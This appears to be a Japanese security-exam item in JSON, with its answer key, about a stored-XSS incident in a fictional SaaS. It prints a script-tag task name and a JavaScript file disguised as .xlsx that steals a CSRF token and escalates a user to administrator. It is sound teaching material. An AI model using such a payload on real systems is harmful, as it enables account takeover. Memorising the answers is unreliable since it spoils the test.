[
  {
    "qNo": 1,
    "theme": "コンサルティング業務で利用する SaaS に関するセキュリティ問題",
    "description": "H社では、コンサルティング業務で利用する SaaS (以下、Sサービスという)を提供している。コンサルティング業務を行う企業 50社程度がSサービスを利用しており、総利用者数は1,000名程度である。\n\n### Sサービスの概要\nS サービスでは、利用企業ごとに複数のプロジェクトを登録できる。Sサービスの利用者には2種類のロールがある。自社の全てのプロジェクトの情報にアクセスできる管理者と、自身に割り当てられているプロジェクトの情報だけにアクセスできる一般利用者である。\nS サービスには、プロジェクトを管理する機能(以下、プロジェクト管理機能という)のほか、利用者がプロジェクト内で特定の話題ごとに“スレッド”と呼ばれるページを作成する機能(以下,スレッド作成機能という), スレッドに文章を投稿したりファイルをアップロードしたりする機能(以下、スレッド投稿機能という)などが設けられている。\nSサービスの主な機能を表1に示す。\n\n**表1 Sサービスの主な機能(抜粋)**\n| 機能名 | 機能概要 | 備考 |\n| :--- | :--- | :--- |\n| ログイン | (省略) | (省略) |\n| 利用者管理 | 管理者が、利用者の登録、変更及び削除を行う。 | 登録された利用者には、利用企業内で一意となる利用者 ID が発行される。利用者IDの形式は次のとおりである。<br>“U”と数字8桁をつなげた文字列 |\n| ロール管理 | 管理者が、利用者のロールを設定する。 | 処理の流れは次のとおりである。<br>1. ログイン後の画面からロール管理機能を選択すると、パス\"/management/role\" にリクエストがGETメソッドで送信される。csrf_token という一時的でランダムな文字列のトークンが発行され、ロール設定画面が表示される。<br>2. ロール設定画面で任意の利用者のロールを変更し、確定ボタンをクリックすると、パス\"/management/roleset\" に対して、パラメータ csrf_token, is_admin 及び user_id を含むリクエストが POST メソッドで送信される。パラメータ is_admin は指定した利用者のロールに応じて次のいずれかが設定される。<br> - 管理者:is_admin=1<br> - 一般利用者:is_admin=0 |\n| プロジェクト管理 | 管理者が、プロジェクトの登録及び変更を行う。また、プロジェクトに一般利用者を割り当てる。 | プロジェクトには、利用企業内で一意となるプロジェクト ID が発行される。プロジェクト ID の形式は次のとおりである。<br>“P”と数字8桁をつなげた文字列 |\n| タスク管理 | 利用者が、プロジェクトのタスク管理画面からタスクを登録し、タスクの担当者を割り当てる。また、タスクの更新を行う。 | タスクには、次の項目を設定する。<br>・タスク名<br>・タスクの詳細説明<br>・タスクの担当者<br>・タスクの締切日<br>・タスクの進捗状況<br>・タスクの完了フラグ |\n| スレッド作成 | 利用者が、スレッドを作成する。 | スレッドの作成時は、アクセスできる一般利用者を指定する。管理者は利用企業内の全てのスレッドにアクセスできる。 |\n| スレッド投稿 | 利用者が、アクセスできるスレッドに文章の投稿とファイルのアップロードを行う。アップロードされたファイルは、ファイル識別子が一意になるように変更されてからサーバに保存される。 | アップロードできるファイルの拡張子は、docx, xlsx, pptx, pdf, jpg, gif 及び pngの7種類である。アップロードされたファイルは、スレッドにアクセスできる利用者だけがアクセスできる。ファイルの参照時及びダウンロード時のパスは次のとおりである。<br> `/files/[一意のファイル識別子].[拡張子]` |\n| プロジェクト進捗管理 | 利用者が、プロジェクトの進捗を管理する。スケジュールの作成及び管理並びにタスクの進捗確認を行う。 | 未完了のタスクのうち締切日を過ぎたものは、プロジェクト進捗管理画面にそのタスク名と締切日からの経過日数が表示される。 |\n\nSサービスでは、半年ごと及び新機能リリース前に診断ツールXによる脆弱性診断を実施することにしている。診断ツールXは、送信したリクエストとそれに対するレスポンスから脆弱性を検出する。\nSサービスでは、HTTP レスポンスヘッダーに Content Security Policy (CSP)を設定している。図1に、Sサービスの HTTP レスポンスヘッダーの例を示す。\n\n**図1 Sサービスの HTTP レスポンスヘッダーの例**\n```\nHTTP/1.1 200 OK\nCache-Control: no-store\nContent-Encoding: gzip\nContent-Type: text/html; charset=UTF-8\nDate: (省略)\nX-Frame-Options: SAMEORIGIN\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nSet-Cookie: JSESSIONID=e962879ef251f2117460cf0d5ce714e3; Secure; HttpOnly\nContent-Security-Policy: default-src 'self';\nContent-Length: 31337\n```\n\n図1の設定では、リソースの読込みとスクリプトの実行に関する動作は次のようになる。\n・Sサービス以外のドメインからのリソースの読込み: [ a ]\n・script タグ内に直接記述されたスクリプトの実行: [ b ]\n\n### インシデントの発生とその調査\nある日、Sサービスを利用しているB社の管理者からH社に対して、“Sサービスの一般利用者であった元従業員Zのローカル PC上に、元従業員Zが割り当てられていなかったプロジェクトのファイルが保存されていたので、Sサービスに不具合がないか調査してほしい”との依頼があった。\nS サービスのシステム担当者であるUさんは、ログを確認するとともに、B社の許可を得た上で、B社の管理者の利用者 ID を使ってログインし、幾つかの画面を確認した。そのうち、プロジェクト進捗管理画面のHTMLを図2に、そのHTMLが参照していた F1234567890.xlsx というファイルをテキストエディターで開いたときの内容を図3に示す。\n\n**図2 プロジェクト進捗管理画面の HTML**\n```html\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title>プロジェクト進捗管理</title>\n<link href=\"/static/css/style.css\" rel=\"stylesheet\" type=\"text/css\">\n<script src=\"/static/js/action.js\"></script>\n</head>\n<body>\n<h1>プロジェクト進捗管理 (プロジェクト ID: P00395000) </h1>\n(省略)\n<div name=\"alert\">\n<div name=\"alert-title\">期限切れタスク一覧</div>\n<div name=\"alert-description\">\n次のタスクが締切日を過ぎています。<br>\n</div>\n<ul className=\"delayed-task\">\n<li>G社のコンペ資料作成 (締切日過ぎ 1日)</li>\n<li>G社の業界分析(締切日過ぎ 4日) </li>\n<li>個人タスク<script src=\"/files/F1234567890.xlsx\"></script> (締切日過ぎ5日) </li>\n</ul>\n</div>\n(省略)\n</body>\n</html>\n```\n\n**図3 F1234567890.xlsx の内容**\n```javascript\n(async function() {\nconst response = await fetch(\"/management/role\");\nconst text = await response.text();\n// 次の2行で csrf_token を取得\nconst tokenMatch = text.match(/id=\"csrf_token\"[^>]*value=\"([^\"]+)\"/);\nconst csrfToken = tokenMatch[1];\nawait fetch(\"/management/roleset\", {\nmethod: \"POST\",\n// POST メソッドのリクエスト body\nbody: new URLSearchParams({\n\"csrf_token\": csrfToken,\n\"is_admin\": \"1\",\n\"user_id\": \"U00331001\"\n})\n});\n})();\n// 注記 整形とコメントの追記は、Uさんによるものである。\n```\n\nUさんは、調査の結果、図4に示す攻撃が実行されていたことを確認した。\n\n**図4 実行されていた攻撃の概要**\n```mermaid\nsequenceDiagram\n    participant Z as 元従業員 Z\n    participant TaskMgmt as タスク管理画面\n    participant ProgressMgmt as 進捗管理画面\n    participant Admin as 管理者[e]\n    \n    Z->>S: 1. F1234567890.xlsxをアップロード\n    Z->>TaskMgmt: 2. [ c ] に文字列 [ d ] を指定しタスク登録\n    Admin->>ProgressMgmt: 3. タスクが条件[f]を満たしたときにアクセス\n    Note right of Admin: 4. 図2のHTMLがWebブラウザに出力\n    Note right of Admin: 5. 図3のスクリプトが実行された\n    S->>S: 6. 元従業員Z (U00331001) に対して処理 [ g ] が行われた\n    Note right of Z: (省略)\n    Z->>S: 8. ファイルをダウンロードした\n```\n\nUさんは、図4の項番2と類似した文字列が指定されたタスクが登録されていないかどうかを確認したところ、完了済みタスクの中に類似したものがあることを確認した。しかし、このタスクによる攻撃は、CSP の設定で防御できていた。\nUさんは、攻撃者がこの失敗の原因を分析し、失敗したときに使用した文字列に①工夫を加えることによって図4の項番2の文字列を作成し、攻撃を成功させたと推測した。\n\n### インシデントへの対応及び攻撃への対策\nUさんは、まず必要なインシデント対応を行った。その結果、図4以外に成功した攻撃はないことが分かった。Uさんは、結果をB社の管理者に報告した。また、ほかの利用企業で同様の攻撃がなかったかどうかを調査したところ、なかったことも分かった。\n次に、図4と同様の攻撃を防止するために、次の対策を行った。\n\n(1) 図4の項番1については、アップロードされたファイルが許可された拡張子であることのチェックに加えて、次の処理を追加する。\n処理: [ h ]\n\n(2) 図4の項番4について、類似の問題がないかどうか、Sサービス全体を確認したところ、問題は1箇所だけだったので、表1の機能のうち、 [ i ] について、②必要な処理を追加する。なお、この処理が行われていないという脆弱性は、診断ツールXでは検知されない。\n\n### 開発プロセスの見直し検討\nUさんは、図4の項番4の脆弱性のように診断ツールXで検知されないものであっても、検知できる可能性のある検査として、次の二つも実施するという開発プロセスの見直し案を作成した。\n・SAST\n・[ j ]\n\nUさんは、開発プロセスの見直し案について承認を得て、見直しに着手した。",
    "context": {
      "title": "コンサルティング業務で利用する SaaS に関するセキュリティ問題",
      "background": "H社では、コンサルティング業務で利用する SaaS (以下、Sサービスという)を提供している。コンサルティング業務を行う企業 50社程度がSサービスを利用しており、総利用者数は1,000名程度である。\n\n## Sサービスの概要\nS サービスでは、利用企業ごとに複数のプロジェクトを登録できる。Sサービスの利用者には2種類のロールがある。自社の全てのプロジェクトの情報にアクセスできる管理者と、自身に割り当てられているプロジェクトの情報だけにアクセスできる一般利用者である。\nS サービスには、プロジェクトを管理する機能(以下、プロジェクト管理機能という)のほか、利用者がプロジェクト内で特定の話題ごとに“スレッド”と呼ばれるページを作成する機能(以下,スレッド作成機能という), スレッドに文章を投稿したりファイルをアップロードしたりする機能(以下、スレッド投稿機能という)などが設けられている。\nSサービスの主な機能は{{diagram:table1}}に示す。\n\nSサービスでは、半年ごと及び新機能リリース前に診断ツールXによる脆弱性診断を実施することにしている。診断ツールXは、送信したリクエストとそれに対するレスポンスから脆弱性を検出する。\nSサービスでは、HTTP レスポンスヘッダーに Content Security Policy (CSP)を設定している。{{diagram:fig1}}に、Sサービスの HTTP レスポンスヘッダーの例を示す。\n\n図1の設定では、リソースの読込みとスクリプトの実行に関する動作は次のようになる。\n・Sサービス以外のドメインからのリソースの読込み: [ a ]\n・script タグ内に直接記述されたスクリプトの実行: [ b ]\n\n## インシデントの発生とその調査\nある日、Sサービスを利用しているB社の管理者からH社に対して、“Sサービスの一般利用者であった元従業員Zのローカル PC上に、元従業員Zが割り当てられていなかったプロジェクトのファイルが保存されていたので、Sサービスに不具合がないか調査してほしい”との依頼があった。\nS サービスのシステム担当者であるUさんは、ログを確認するとともに、B社の許可を得た上で、B社の管理者の利用者 ID を使ってログインし、幾つかの画面を確認した。そのうち、プロジェクト進捗管理画面のHTMLを{{diagram:fig2}}に、そのHTMLが参照していた F1234567890.xlsx というファイルをテキストエディターで開いたときの内容を{{diagram:fig3}}に示す。\n\nUさんは、調査の結果、{{diagram:fig4}}に示す攻撃が実行されていたことを確認した。\n\nUさんは、図4の項番2と類似した文字列が指定されたタスクが登録されていないかどうかを確認したところ、完了済みタスクの中に類似したものがあることを確認した。しかし、このタスクによる攻撃は、CSP の設定で防御できていた。\nUさんは、攻撃者がこの失敗の原因を分析し、失敗したときに使用した文字列に①工夫を加えることによって図4の項番2の文字列を作成し、攻撃を成功させたと推測した。\n\n## インシデントへの対応及び攻撃への対策\nUさんは、まず必要なインシデント対応を行った。その結果、図4以外に成功した攻撃はないことが分かった。Uさんは、結果をB社の管理者に報告した。また、ほかの利用企業で同様の攻撃がなかったかどうかを調査したところ、なかったことも分かった。\n次に、図4と同様の攻撃を防止するために、次の対策を行った。\n\n(1) 図4の項番1については、アップロードされたファイルが許可された拡張子であることのチェックに加えて、次の処理を追加する。\n処理: [ h ]\n\n(2) 図4の項番4について、類似の問題がないかどうか、Sサービス全体を確認したところ、問題は1箇所だけだったので、表1の機能のうち、 [ i ] について、②必要な処理を追加する。なお、この処理が行われていないという脆弱性は、診断ツールXでは検知されない。\n\n## 開発プロセスの見直し検討\nUさんは、図4の項番4の脆弱性のように診断ツールXで検知されないものであっても、検知できる可能性のある検査として、次の二つも実施するという開発プロセスの見直し案を作成した。\n・SAST\n・[ j ]\n\nUさんは、開発プロセスの見直し案について承認を得て、見直しに着手した。",
      "diagrams": [
        {
          "id": "table1",
          "label": "表1 Sサービスの主な機能(抜粋)",
          "type": "markdown",
          "content": "| 機能名 | 機能概要 | 備考 |\n| :--- | :--- | :--- |\n| ログイン | (省略) | (省略) |\n| 利用者管理 | 管理者が、利用者の登録、変更及び削除を行う。 | 登録された利用者には、利用企業内で一意となる利用者 ID が発行される。利用者IDの形式は次のとおりである。<br>“U”と数字8桁をつなげた文字列 |\n| ロール管理 | 管理者が、利用者のロールを設定する。 | 処理の流れは次のとおりである。<br>1. ログイン後の画面からロール管理機能を選択すると、パス\"/management/role\" にリクエストがGETメソッドで送信される。csrf_token という一時的でランダムな文字列のトークンが発行され、ロール設定画面が表示される。<br>2. ロール設定画面で任意の利用者のロールを変更し、確定ボタンをクリックすると、パス\"/management/roleset\" に対して、パラメータ csrf_token, is_admin 及び user_id を含むリクエストが POST メソッドで送信される。パラメータ is_admin は指定した利用者のロールに応じて次のいずれかが設定される。<br> - 管理者:is_admin=1<br> - 一般利用者:is_admin=0 |\n| プロジェクト管理 | 管理者が、プロジェクトの登録及び変更を行う。また、プロジェクトに一般利用者を割り当てる。 | プロジェクトには、利用企業内で一意となるプロジェクト ID が発行される。プロジェクト ID の形式は次のとおりである。<br>“P”と数字8桁をつなげた文字列 |\n| タスク管理 | 利用者が、プロジェクトのタスク管理画面からタスクを登録し、タスクの担当者を割り当てる。また、タスクの更新を行う。 | タスクには、次の項目を設定する。<br>・タスク名<br>・タスクの詳細説明<br>・タスクの担当者<br>・タスクの締切日<br>・タスクの進捗状況<br>・タスクの完了フラグ |\n| スレッド作成 | 利用者が、スレッドを作成する。 | スレッドの作成時は、アクセスできる一般利用者を指定する。管理者は利用企業内の全てのスレッドにアクセスできる。 |\n| スレッド投稿 | 利用者が、アクセスできるスレッドに文章の投稿とファイルのアップロードを行う。アップロードされたファイルは、ファイル識別子が一意になるように変更されてからサーバに保存される。 | アップロードできるファイルの拡張子は、docx, xlsx, pptx, pdf, jpg, gif 及び pngの7種類である。アップロードされたファイルは、スレッドにアクセスできる利用者だけがアクセスできる。ファイルの参照時及びダウンロード時のパスは次のとおりである。<br> `/files/[一意のファイル識別子].[拡張子]` |\n| プロジェクト進捗管理 | 利用者が、プロジェクトの進捗を管理する。スケジュールの作成及び管理並びにタスクの進捗確認を行う。 | 未完了のタスクのうち締切日を過ぎたものは、プロジェクト進捗管理画面にそのタスク名と締切日からの経過日数が表示される。 |"
        },
        {
          "id": "fig1",
          "label": "図1 Sサービスの HTTP レスポンスヘッダーの例",
          "type": "markdown",
          "content": "HTTP/1.1 200 OK\nCache-Control: no-store\nContent-Encoding: gzip\nContent-Type: text/html; charset=UTF-8\nDate: (省略)\nX-Frame-Options: SAMEORIGIN\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nSet-Cookie: JSESSIONID=e962879ef251f2117460cf0d5ce714e3; Secure; HttpOnly\nContent-Security-Policy: default-src 'self';\nContent-Length: 31337"
        },
        {
          "id": "fig2",
          "label": "図2 プロジェクト進捗管理画面の HTML",
          "type": "markdown",
          "content": "<html>\n<head>\n<meta charset=\"UTF-8\">\n<title>プロジェクト進捗管理</title>\n<link href=\"/static/css/style.css\" rel=\"stylesheet\" type=\"text/css\">\n<script src=\"/static/js/action.js\"></script>\n</head>\n<body>\n<h1>プロジェクト進捗管理 (プロジェクト ID: P00395000) </h1>\n(省略)\n<div name=\"alert\">\n<div name=\"alert-title\">期限切れタスク一覧</div>\n<div name=\"alert-description\">\n次のタスクが締切日を過ぎています。<br>\n</div>\n<ul className=\"delayed-task\">\n<li>G社のコンペ資料作成 (締切日過ぎ 1日)</li>\n<li>G社の業界分析(締切日過ぎ 4日) </li>\n<li>個人タスク<script src=\"/files/F1234567890.xlsx\"></script> (締切日過ぎ5日) </li>\n</ul>\n</div>\n(省略)\n</body>\n</html>"
        },
        {
          "id": "fig3",
          "label": "図3 F1234567890.xlsx の内容",
          "type": "markdown",
          "content": "(async function() {\nconst response = await fetch(\"/management/role\");\nconst text = await response.text();\n// 次の2行で csrf_token を取得\nconst tokenMatch = text.match(/id=\"csrf_token\"[^>]*value=\"([^\"]+)\"/);\nconst csrfToken = tokenMatch[1];\nawait fetch(\"/management/roleset\", {\nmethod: \"POST\",\n// POST メソッドのリクエスト body\nbody: new URLSearchParams({\n\"csrf_token\": csrfToken,\n\"is_admin\": \"1\",\n\"user_id\": \"U00331001\"\n})\n});\n})();\n// 注記 整形とコメントの追記は、Uさんによるものである。"
        },
        {
          "id": "fig4",
          "label": "図4 実行されていた攻撃の概要",
          "type": "mermaid",
          "content": "sequenceDiagram\n    participant Z as 元従業員 Z\n    participant TaskMgmt as タスク管理画面\n    participant ProgressMgmt as 進捗管理画面\n    participant Admin as 管理者[e]\n    \n    Z->>S: 1. F1234567890.xlsxをアップロード\n    Z->>TaskMgmt: 2. [ c ] に文字列 [ d ] を指定しタスク登録\n    Admin->>ProgressMgmt: 3. タスクが条件[f]を満たしたときにアクセス\n    Note right of Admin: 4. 図2のHTMLがWebブラウザに出力\n    Note right of Admin: 5. 図3のスクリプトが実行された\n    S->>S: 6. 元従業員Z (U00331001) に対して処理 [ g ] が行われた\n    Note right of Z: (省略)\n    Z->>S: 8. ファイルをダウンロードした"
        }
      ]
    },
    "questions": [
      {
        "subQNo": "設問1",
        "text": "本文中の [ a ], [ b ] に入れる適切な字句を、“できる”,“できない”のいずれかでそれぞれ答えよ。",
        "references": [
          "fig1"
        ],
        "subQuestions": [
          {
            "label": "a",
            "text": "Sサービス以外のドメインからのリソースの読込み",
            "answer": "できない"
          },
          {
            "label": "b",
            "text": "script タグ内に直接記述されたスクリプトの実行",
            "answer": "できない"
          }
        ]
      },
      {
        "subQNo": "設問2",
        "text": "〔インシデントの発生とその調査〕について答えよ。",
        "subQuestions": [
          {
            "label": "(1)",
            "text": "図3のスクリプトは、表1中のどの機能を悪用するものか。機能名を答えよ。",
            "references": [
              "fig3",
              "table1"
            ],
            "answer": "ロール管理"
          },
          {
            "label": "(2)",
            "text": "図4中の [ c ] に入れる適切なタスクの項目を、表1中の字句を用いて答えよ。",
            "references": [
              "fig4",
              "table1"
            ],
            "answer": "タスク名"
          },
          {
            "label": "(3)",
            "text": "図4中の [ d ] に入れる適切な文字列を、図2から抜き出して答えよ。",
            "references": [
              "fig4",
              "fig2"
            ],
            "answer": "個人タスク<script src=\"/files/F1234567890.xlsx\"></script>"
          },
          {
            "label": "(4)",
            "text": "図4中の [ e ] ~ [ g ] に入れる適切な字句を答えよ。",
            "references": [
              "fig4"
            ],
            "subQuestions": [
              {
                "label": "e",
                "text": "管理者[e]",
                "answer": "管理者"
              },
              {
                "label": "f",
                "text": "タスクが条件[f]を満たしたときにアクセス",
                "answer": "締切日を過ぎている"
              },
              {
                "label": "g",
                "text": "元従業員Z (U00331001) に対して処理 [ g ] が行われた",
                "answer": "ロールが管理者に変更された"
              }
            ]
          },
          {
            "label": "(5)",
            "text": "本文中の下線①について、工夫の内容を、具体的に答えよ。",
            "references": [
              "fig1",
              "fig3",
              "fig4"
            ],
            "answer": "インラインスクリプトではなく、Sサービスのファイルアップロード機能を利用して悪意のあるスクリプトをアップロードし、そのファイルパスを`script src`属性に指定する形式に変更したこと。"
          }
        ]
      },
      {
        "subQNo": "設問3",
        "text": "〔インシデントへの対応及び攻撃への対策〕について答えよ。",
        "subQuestions": [
          {
            "label": "(1)",
            "text": "本文中の [ h ] に入れる追加すべき処理の内容を、具体的に答えよ。",
            "references": [
              "fig4",
              "table1"
            ],
            "answer": "アップロードされたファイルの内容を検査し、拡張子に対応する MIME タイプ (Content Type) が適切であるかを確認すること。"
          },
          {
            "label": "(2)",
            "text": "本文中の [ i ] に入れる適切な機能名を答えよ。",
            "references": [
              "fig4",
              "table1"
            ],
            "answer": "プロジェクト進捗管理"
          },
          {
            "label": "(3)",
            "text": "本文中の下線②について、追加すべき処理の内容を、具体的に答えよ。",
            "references": [
              "fig2"
            ],
            "answer": "プロジェクト進捗管理画面にタスク名などの利用者が入力した文字列を出力する際、HTMLエスケープ処理を行うこと。"
          }
        ]
      },
      {
        "subQNo": "設問4",
        "text": "本文中の [ j ] に入れる適切な検査方法を、具体的に答えよ。",
        "answer": "ペネトレーションテスト"
      }
    ]
  }
]